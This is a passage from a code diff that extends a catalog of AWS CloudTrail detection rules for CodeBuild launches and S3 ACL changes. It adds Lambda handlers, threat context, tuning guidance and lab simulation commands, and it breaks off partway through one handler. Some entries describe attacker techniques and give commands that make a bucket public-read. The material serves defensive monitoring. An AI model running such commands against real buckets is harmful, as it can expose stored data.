     awsService: "CodeBuild",
     relatedServices: ["IAM"],
     severity: "High",
@@ -14178,18 +17019,98 @@ ORDER BY eventTime DESC
 | filter eventName = "StartBuild"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
+      lambda: `"""
+Rare or New Project Used for Build Trigger
+Trigger: EventBridge rule matching StartBuild.
+Use for: Baseline-aware detection of rare actor-to-project launches.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "codebuild.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "StartBuild":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": "requires-actor-project-first-seen-or-rarity-check",
+        "alert": {
+            "rule_id": "det-130",
+            "title": "Rare or New Project Used for Build Trigger",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "project_name": request.get("projectName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.projectName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { projectName: "dormant-project" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the project and actor.", "Verify if project use was expected.", "Build baseline of (actor, project) for anomaly detection."],
-    testingSteps: ["StartBuild on a project the actor has not used recently.", "Verify detection with baseline."],
+    investigationSteps: ["Identify the actor, project, and whether this actor-to-project pair is first-seen or rarely observed.", "Verify whether the project is normally started by the actor or only by other pipeline identities.", "Assess the project's privilege level and whether the rare launch was followed by overrides or sensitive activity."],
+    testingSteps: ["Start a build on a project the actor has not used in the baseline window.", "Verify the baseline lookup or first-seen model flags the actor-to-project pair as new or rare.", "Run the detector and confirm it depends on historical rarity rather than the event alone."],
+    lifecycle: {
+      whyItMatters: "Rare actor-to-project launches can expose opportunistic use of less-monitored build projects that still have high-value access. This is especially important in large CI/CD estates where dormant projects retain privileged roles.",
+      threatContext: {
+        attackerBehavior: "An attacker may select a rarely used or unfamiliar build project that has useful secrets, deployment rights, or runtime trust relationships.",
+        realWorldUsage: "This is attractive because dormant or niche projects may be overlooked operationally while still offering privileged execution paths.",
+        whyItMatters: "The anomaly is not that a build happened, but that a particular actor started a project they almost never or have never used before.",
+        riskAndImpact: "If missed, defenders may not notice when a compromised identity reaches for an obscure but powerful build path.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for CodeBuild", "Historical actor-to-project baseline data"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.projectName", "sourceIPAddress"],
+        loggingRequirements: ["StartBuild events must be retained long enough to build actor-to-project baselines.", "The platform should track first-seen dates and rarity for actor-project pairs.", "Project criticality should be available to prioritize rare launches."],
+        limitations: ["New engineers, new projects, and legitimate project rotation can create benign first-seen launches.", "The signal depends heavily on baseline quality.", "Rarity alone does not prove malicious intent."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor launching the build" },
+          { rawPath: "requestParameters.projectName", normalizedPath: "aws.codebuild.project.name", notes: "Build project being launched" },
+          { rawPath: "baseline.firstSeen", normalizedPath: "risk.baseline.first_seen", notes: "First-seen timestamp for the actor-to-project pair" },
+          { rawPath: "baseline.rarityScore", normalizedPath: "risk.baseline.rarity_score", notes: "Historical rarity of the actor-to-project pair" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["process"], type: ["start"], action: "StartBuild", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { codebuild: { project: { name: "dormant-project" } } },
+          risk: { baseline: { first_seen: "2025-02-10T12:45:00Z", rarity_score: "new_pair" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Actor-to-Project Baseline", description: "Track how often the actor launches the project and when that pairing was first seen.", examples: ["never seen before", "rare quarterly use"], falsePositiveReduction: "Makes the anomaly specific and explainable." },
+        { dimension: "Project Privilege and Secret Exposure", description: "Classify the project's access to secrets, deploy roles, or production systems.", examples: ["prod deployment project", "low-risk unit test project"], falsePositiveReduction: "Raises urgency for rare launches on powerful projects." },
+        { dimension: "Follow-On Build Risk", description: "Check whether the rare launch also included overrides or later sensitive activity.", examples: ["new pair plus override", "new pair plus GetSecretValue"], falsePositiveReduction: "Improves confidence when rarity aligns with additional suspicious behavior." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect first-seen or historically rare actor-to-project `StartBuild` pairs. It should compare the current launch against a baseline table and alert when the actor rarely or never launches the target project.",
+        conditions: ["eventSource equals codebuild.amazonaws.com", "eventName equals StartBuild", "actor-to-project pair is first-seen or falls below the configured historical frequency threshold"],
+        tuningGuidance: "1. Build baselines over a meaningful historical window. 2. Exempt expected new-project rollout patterns where needed. 3. Escalate strongly when rare launches hit sensitive projects or align with overrides or follow-on sensitive activity.",
+        whenToFire: "Fire when a CodeBuild launch uses a project that is new or rare for the initiating actor.",
+      },
+      simulationCommand: "aws codebuild start-build --project-name dormant-project --profile dev-user",
+      quality: {
+        signalQuality: 7,
+        falsePositiveRate: "Medium without strong baselines, low-medium with historical actor-project modeling",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM anomaly engines", "Athena with baseline tables", "Datadog / Chronicle / Panther", "EventBridge + Lambda with external state"],
+        scheduling: "Scheduled baseline refresh plus near-real-time evaluation works best.",
+        considerations: ["This is the anomaly branch of the CodeBuild family.", "Actor-project baseline quality is the main dependency."],
+      },
+    },
   },
 
   // --- S3 ACL Persistence ---
   {
     id: "det-131",
     title: "S3 ACL Changed",
-    description: "Baseline visibility for any bucket or object ACL modification. ACL changes are sensitive, though not always malicious in legacy environments.",
+    description: "Baseline visibility for S3 bucket or object ACL modification. ACL mutations remain security-sensitive in legacy or exception-based environments even though many modern buckets disable ACL effectiveness.",
     awsService: "S3",
     relatedServices: [],
     severity: "Medium",
@@ -14221,16 +17142,96 @@ ORDER BY eventTime DESC`,
 | filter eventName in ["PutBucketAcl", "PutObjectAcl"]
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
+      lambda: `"""
+S3 ACL Changed
+Trigger: EventBridge rule matching PutBucketAcl or PutObjectAcl.
+Use for: Baseline visibility into S3 ACL mutations.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "s3.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"PutBucketAcl", "PutObjectAcl"}:
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-131",
+            "title": "S3 ACL Changed",
+            "severity": "Medium",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "bucket_name": request.get("bucketName"),
+            "object_key": request.get("key"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.key", "requestParameters.acl", "requestParameters.AccessControlPolicy", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { bucketName: "my-bucket" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and target bucket/object.", "Verify if ACL change was authorized.", "Check for cross-account or broad grants."],
-    testingSteps: ["Call PutBucketAcl or PutObjectAcl.", "Verify CloudTrail captures the event.", "Run the detection."],
+    investigationSteps: ["Identify the actor, target bucket or object, and the exact ACL form used in the request.", "Determine whether the target bucket still honors ACLs or uses `BucketOwnerEnforced` object ownership.", "Check for follow-on access, public exposure, or cross-account grants after the ACL change."],
+    testingSteps: ["Run `PutBucketAcl` or `PutObjectAcl` in a lab bucket or object.", "Verify CloudTrail records the request parameters and target names.", "Run the baseline detector and confirm it records all ACL mutations."],
+    lifecycle: {
+      whyItMatters: "ACL changes are the feeder telemetry for the entire S3 ACL persistence family. Even where ACLs are legacy, a successful ACL mutation can enable persistence, exposure, or unauthorized sharing.",
+      threatContext: {
+        attackerBehavior: "An attacker may change a bucket or object ACL to maintain access, broaden access to another principal, or stage later data theft.",
+        realWorldUsage: "This remains relevant in environments that still use ACLs for compatibility, legacy applications, or exception paths.",
+        whyItMatters: "The baseline event is essential because higher-confidence detections depend on seeing the raw ACL mutation before evaluating effectiveness, actor authorization, and recipient scope.",
+        riskAndImpact: "If missed, defenders may not recognize the first control-plane step that enabled later S3 persistence or sharing abuse.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail data or management events for S3 ACL operations"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.key", "requestParameters.acl", "requestParameters.AccessControlPolicy", "sourceIPAddress"],
+        loggingRequirements: ["CloudTrail must ingest `PutBucketAcl` and `PutObjectAcl`.", "The platform should preserve canned ACLs and structured grant details where available.", "Bucket object-ownership state should be available for downstream effectiveness checks."],
+        limitations: ["The event alone does not prove the ACL was materially effective if ACLs are disabled.", "Legacy workloads may still generate benign ACL changes.", "The request format varies between canned ACLs and explicit access-control-policy structures."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.bucketName", normalizedPath: "s3.bucket.name", notes: "Bucket whose ACL was modified" },
+          { rawPath: "requestParameters.key", normalizedPath: "file.path", notes: "Object key for PutObjectAcl where present" },
+          { rawPath: "requestParameters.acl", normalizedPath: "s3.acl.canned", notes: "Canned ACL value where used" },
+          { rawPath: "requestParameters.AccessControlPolicy", normalizedPath: "s3.acl.policy", notes: "Structured grant payload where used" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["file"], type: ["change"], action: "PutBucketAcl", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
+          s3: { bucket: { name: "my-bucket" }, acl: { canned: "private" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "ACL Effectiveness", description: "Determine whether the target bucket still honors ACLs or uses `BucketOwnerEnforced` ownership.", examples: ["ACLs enabled", "BucketOwnerEnforced"], falsePositiveReduction: "Separates visible-but-ineffective ACL changes from materially risky ones." },
+        { dimension: "Grant Scope", description: "Classify whether the ACL was private, cross-account, or broad/public.", examples: ["private", "cross-account grant", "public-read"], falsePositiveReduction: "Improves triage and downstream routing." },
+        { dimension: "Target Sensitivity", description: "Classify the target bucket or object by data sensitivity and exposure.", examples: ["customer artifacts", "public website assets"], falsePositiveReduction: "Prioritizes impactful ACL changes." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a broad visibility rule for successful `PutBucketAcl` and `PutObjectAcl` events. It establishes the S3 ACL mutation baseline that effective-state, broad-grant, unauthorized-actor, and access-correlation detections build on.",
+        conditions: ["eventSource equals s3.amazonaws.com", "eventName equals PutBucketAcl or PutObjectAcl", "errorCode is absent"],
+        tuningGuidance: "1. Keep the baseline broad. 2. Add ACL-effectiveness and target context for triage. 3. Route broad-grant or unexpected-actor variants to higher-severity detectors.",
+        whenToFire: "Fire on every successful bucket or object ACL change for visibility.",
+      },
+      simulationCommand: "aws s3api put-bucket-acl --bucket my-bucket --acl private",
+      quality: {
+        signalQuality: 6,
+        falsePositiveRate: "Medium as baseline visibility, low-medium with ACL-effectiveness context",
+        expectedVolume: "Low in modern environments",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because ACL changes can immediately expose or preserve access.",
+        considerations: ["This is the feeder rule for the S3 ACL persistence family.", "ACL-effectiveness context is the main enrichment."],
+      },
+    },
   },
   {
     id: "det-132",
-    title: "ACL Changed on Bucket with ACLs Enabled",
-    description: "Detects meaningful ACL persistence in environments where ACLs are still active. Successful PutBucketAcl/PutObjectAcl are only materially effective when ACLs are not disabled by BucketOwnerEnforced.",
+    title: "ACL Changed on ACL-Effective Target",
+    description: "Detects ACL mutations that are materially effective because the target bucket or object still honors ACLs. This should distinguish real access-control changes from no-op ACL requests against `BucketOwnerEnforced` targets.",
     awsService: "S3",
     relatedServices: [],
     severity: "High",
@@ -14268,16 +17269,96 @@ ORDER BY eventTime DESC`,
 | filter not ispresent(errorCode) or errorCode = ""
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
+      lambda: `"""
+ACL Changed on ACL-Effective Target
+Trigger: EventBridge rule matching PutBucketAcl or PutObjectAcl.
+Use for: Evaluating whether S3 ACL mutations are materially effective.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "s3.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"PutBucketAcl", "PutObjectAcl"}:
+        return {"matched": False}
+    if detail.get("errorCode"):
+        return {"matched": False}
+
+    return {
+        "matched": "requires-acl-effectiveness-check",
+        "alert": {
+            "rule_id": "det-132",
+            "title": "ACL Changed on ACL-Effective Target",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.acl", "errorCode", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { bucketName: "legacy-bucket", acl: "public-read" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the bucket and ACL change.", "Verify if bucket has ACLs enabled (not BucketOwnerEnforced).", "Check for cross-account or public grants."],
-    testingSteps: ["PutBucketAcl on ACL-enabled bucket.", "Verify detection triggers."],
+    investigationSteps: ["Verify the target bucket or object still honors ACLs and is not protected by `BucketOwnerEnforced` object ownership.", "Inspect the exact grant scope to determine whether the effective change preserved or broadened access.", "Check whether the bucket is legacy, exception-based, or especially sensitive."],
+    testingSteps: ["Apply `PutBucketAcl` or `PutObjectAcl` to a lab bucket with ACLs enabled.", "Verify CloudTrail records a successful ACL change and your enrichment marks the target as ACL-effective.", "Run the detector and confirm it excludes ineffective ACL requests where ownership controls disable ACL impact."],
+    lifecycle: {
+      whyItMatters: "The most important distinction in modern S3 ACL monitoring is whether the ACL change actually matters. This rule isolates the subset of ACL mutations that can still alter access behavior.",
+      threatContext: {
+        attackerBehavior: "An attacker may prefer ACL changes on legacy or exception-based buckets because those targets still respect ACL grants and can be abused for persistence or sharing.",
+        realWorldUsage: "This matters most in older estates, migration gaps, or workloads that retained ACL semantics for compatibility.",
+        whyItMatters: "A successful ACL request is not enough; defenders need to know whether the target still honors ACLs.",
+        riskAndImpact: "If missed, defenders may under-prioritize real access changes or over-prioritize ineffective no-op ACL requests.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail for S3 ACL operations", "S3 object ownership or bucket configuration inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "errorCode", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.key", "requestParameters.acl"],
+        loggingRequirements: ["CloudTrail must capture successful ACL mutations.", "The environment must know whether the target bucket uses `BucketOwnerEnforced` or still honors ACLs.", "ACL-effectiveness enrichment should be refreshed reliably."],
+        limitations: ["The event alone cannot determine effectiveness without external bucket-ownership context.", "Object-level nuance may still matter for some workloads.", "Legacy buckets may legitimately use ACLs as part of normal operations."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.bucketName", normalizedPath: "s3.bucket.name", notes: "Target bucket whose ACL was changed" },
+          { rawPath: "requestParameters.key", normalizedPath: "file.path", notes: "Target object for PutObjectAcl where present" },
+          { rawPath: "enrichment.objectOwnershipMode", normalizedPath: "s3.bucket.object_ownership", notes: "Whether ACLs are effective on the target" },
+          { rawPath: "errorCode", normalizedPath: "error.code", notes: "Should be absent for successful effective ACL change" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["file"], type: ["change"], action: "PutBucketAcl", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          s3: { bucket: { name: "legacy-bucket", object_ownership: "ObjectWriter" }, acl: { canned: "public-read" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Object Ownership Mode", description: "Determine whether the target uses `BucketOwnerEnforced` or another mode where ACLs remain effective.", examples: ["BucketOwnerEnforced", "ObjectWriter"], falsePositiveReduction: "Separates effective ACL changes from ineffective ones." },
+        { dimension: "Legacy Bucket Classification", description: "Classify whether the bucket is a legacy or exception path where ACLs are expected.", examples: ["legacy website bucket", "modern private data bucket"], falsePositiveReduction: "Improves triage of materially risky ACL changes." },
+        { dimension: "Grant Impact", description: "Assess whether the effective ACL preserved private access or broadened it.", examples: ["private reset", "public-read"], falsePositiveReduction: "Directs investigations toward the highest-risk effective changes." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect successful ACL mutations only when the target still honors ACLs. It should match `PutBucketAcl` or `PutObjectAcl`, require success, and then use bucket ownership context to determine whether the ACL change is materially effective.",
+        conditions: ["eventSource equals s3.amazonaws.com", "eventName equals PutBucketAcl or PutObjectAcl", "errorCode is absent", "target bucket or object still honors ACLs and is not effectively neutralized by BucketOwnerEnforced"],
+        tuningGuidance: "1. Keep the success check exact. 2. Resolve object-ownership state before alerting. 3. Escalate further when the effective ACL also broadens access or touches sensitive targets.",
+        whenToFire: "Fire when an ACL change succeeds on a target where ACLs are still effective.",
+      },
+      simulationCommand: "aws s3api put-bucket-acl --bucket legacy-bucket --acl public-read",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with ownership enrichment",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with bucket-ownership joins", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because effective ACL changes can alter access immediately.",
+        considerations: ["This is the effective-state branch of the S3 ACL family.", "Bucket ownership enrichment is the main dependency."],
+      },
+    },
   },
   {
     id: "det-133",
     title: "Cross-Account or Broad ACL Grant",
-    description: "Detects likely persistence or unauthorized sharing when ACL changes grant another AWS account or broad access. Flag cross-account grants, public-style grants (public-read, public-read-write), or full-control grants to unexpected principals.",
+    description: "Detects materially risky ACL grants that expose S3 buckets or objects to public, authenticated, or external-account access. This should parse grant scope rather than rely on loose text heuristics alone.",
     awsService: "S3",
     relatedServices: [],
     severity: "Critical",
@@ -14321,16 +17402,94 @@ ORDER BY eventTime DESC`,
 | filter requestParameters.acl like /public|authenticated/ or requestParameters.AccessControlPolicy like /Grant|Grantee/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
+      lambda: `"""
+Cross-Account or Broad ACL Grant
+Trigger: EventBridge rule matching PutBucketAcl or PutObjectAcl.
+Use for: Real-time detection of risky S3 ACL grants.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "s3.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"PutBucketAcl", "PutObjectAcl"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-acl-grant-scope-parsing",
+        "alert": {
+            "rule_id": "det-133",
+            "title": "Cross-Account or Broad ACL Grant",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.acl", "requestParameters.AccessControlPolicy", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { bucketName: "target", acl: "public-read" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the ACL grant details.", "Verify if cross-account or public grant was authorized.", "Check recipient account IDs in AccessControlPolicy."],
-    testingSteps: ["PutBucketAcl with public-read or cross-account grant.", "Verify detection triggers."],
+    investigationSteps: ["Parse the exact ACL outcome, including canned ACL values and any grantee accounts or groups.", "Determine whether the grant created public, authenticated-user, or external-account access and whether the target still honors ACLs.", "Check whether the grant recipient is expected for the target bucket or object."],
+    testingSteps: ["Apply `PutBucketAcl` or `PutObjectAcl` with a public or external-account grant in a lab bucket where ACLs are effective.", "Verify CloudTrail records either the canned ACL or structured access-control-policy grant details.", "Run the detector and confirm it identifies broad or cross-account exposure specifically."],
+    lifecycle: {
+      whyItMatters: "Broad and external ACL grants are the highest-risk ACL changes because they can immediately expose data or preserve access for another principal outside the normal policy path.",
+      threatContext: {
+        attackerBehavior: "An attacker may grant access to the `AllUsers` or `AuthenticatedUsers` groups, or to a separate AWS account they control, to preserve access or stage exfiltration.",
+        realWorldUsage: "This is attractive in legacy ACL-enabled environments where exposure can be created quickly without editing bucket policy.",
+        whyItMatters: "The grant scope is the real security signal: public, authenticated, or external-account exposure should be handled as a top-priority S3 event.",
+        riskAndImpact: "If missed, defenders may fail to detect direct data exposure or external persistence introduced through ACLs.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail for S3 ACL operations", "Bucket ownership and ACL-effectiveness inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.key", "requestParameters.acl", "requestParameters.AccessControlPolicy"],
+        loggingRequirements: ["CloudTrail must preserve canned ACLs and structured grant payloads where possible.", "The environment should parse S3 grantee groups and canonical-user or account grants.", "ACL-effectiveness context should be available to avoid over-alerting on disabled ACL targets."],
+        limitations: ["Structured grant details may be difficult to query directly depending on storage format.", "Some legacy workflows may legitimately share data cross-account.", "Canned ACL text alone does not capture every nuanced grantee relationship."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.acl", normalizedPath: "s3.acl.canned", notes: "Canned ACL exposing the target where present" },
+          { rawPath: "requestParameters.AccessControlPolicy", normalizedPath: "s3.acl.policy", notes: "Structured ACL grants and grantees" },
+          { rawPath: "enrichment.grantScope", normalizedPath: "s3.acl.grant_scope", notes: "Resolved exposure class such as public or external-account" },
+          { rawPath: "requestParameters.bucketName", normalizedPath: "s3.bucket.name", notes: "Target bucket receiving risky ACL grant" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["file"], type: ["change"], action: "PutBucketAcl", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          s3: { bucket: { name: "target" }, acl: { canned: "public-read", grant_scope: "public" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Grant Scope", description: "Resolve whether the ACL created public, authenticated-user, or external-account access.", examples: ["public", "authenticated-users", "external-account"], falsePositiveReduction: "Makes broad exposure explicit instead of inferring from raw text only." },
+        { dimension: "Expected Sharing Inventory", description: "Determine whether the specific grantee or exposure class is approved for the target.", examples: ["approved partner account", "unexpected external account"], falsePositiveReduction: "Separates legitimate sharing from suspicious exposure." },
+        { dimension: "Target Data Sensitivity", description: "Classify the exposed bucket or object by business sensitivity.", examples: ["customer data", "public website assets"], falsePositiveReduction: "Improves prioritization of risky ACL grants." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect ACL changes that create broad or external exposure. It should parse canned ACLs and structured grants to identify public, authenticated-user, or external-account access on ACL-effective targets.",
+        conditions: ["eventSource equals s3.amazonaws.com", "eventName equals PutBucketAcl or PutObjectAcl", "ACL result resolves to public, authenticated-users, or external-account access", "target still honors ACLs where that context is available"],
+        tuningGuidance: "1. Parse grant scope explicitly. 2. Maintain approved-sharing inventories for known partner accounts. 3. Escalate strongly for public exposure or sensitive data targets.",
+        whenToFire: "Fire when an ACL change grants broad or external access to a bucket or object.",
+      },
+      simulationCommand: "aws s3api put-bucket-acl --bucket target --acl public-read",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with approved-sharing context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with ACL grant parsing", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because broad ACL grants can expose data immediately.",
+        considerations: ["This is the grant-scope branch of the S3 ACL family.", "Grant parsing and approved-sharing inventories are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-134",
-    title: "ACL Persistence by Unexpected Actor",
-    description: "Detects ACL changes by identities that normally should not manage bucket/object sharing. Suspicious: IAM users outside storage/platform admin, application roles, unusual assumed roles.",
+    title: "ACL Persistence Outside Authorized Storage Access Path",
+    description: "Detects S3 ACL mutations by identities outside approved storage-administration or automation paths. This should use explicit actor authorization and workflow provenance, not role-name substring allowlists.",
     awsService: "S3",
     relatedServices: [],
     severity: "High",
@@ -14348,45 +17507,108 @@ detection:
     eventName:
       - PutBucketAcl
       - PutObjectAcl
-  filter_arn:
-    userIdentity.arn|contains:
-      - '/role/Storage'
-      - '/role/Platform'
-      - '/role/Admin'
-  filter_automation:
-    userIdentity.principalId|contains:
-      - 'terraform'
-      - 'cloudformation'
-  condition: selection and not (filter_arn or filter_automation)
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=PutBucketAcl OR eventName=PutObjectAcl)
-| where NOT (like(userIdentity.arn, "%/role/Storage%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%"))
 | table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.bucketName, requestParameters.key, sourceIPAddress`,
       cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.bucketName, requestParameters.key, sourceIPAddress
 FROM cloudtrail_logs
 WHERE eventSource = 's3.amazonaws.com'
   AND eventName IN ('PutBucketAcl', 'PutObjectAcl')
-  AND userIdentity.arn NOT LIKE '%/role/Storage%'
-  AND userIdentity.arn NOT LIKE '%/role/Platform%'
-  AND userIdentity.arn NOT LIKE '%/role/Admin%'
-  AND (userIdentity.principalId IS NULL OR (userIdentity.principalId NOT LIKE '%terraform%' AND userIdentity.principalId NOT LIKE '%cloudformation%'))
 ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.bucketName, requestParameters.key
 | filter eventSource = "s3.amazonaws.com"
 | filter eventName in ["PutBucketAcl", "PutObjectAcl"]
-| filter userIdentity.arn not like /\\/role\\/(Storage|Platform|Admin)/ and userIdentity.principalId not like /terraform|cloudformation/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
+      lambda: `"""
+ACL Persistence Outside Authorized Storage Access Path
+Trigger: EventBridge rule matching PutBucketAcl or PutObjectAcl.
+Use for: Authorization checks on S3 ACL mutations.
+"""
+
+def lambda_handler(event, context):
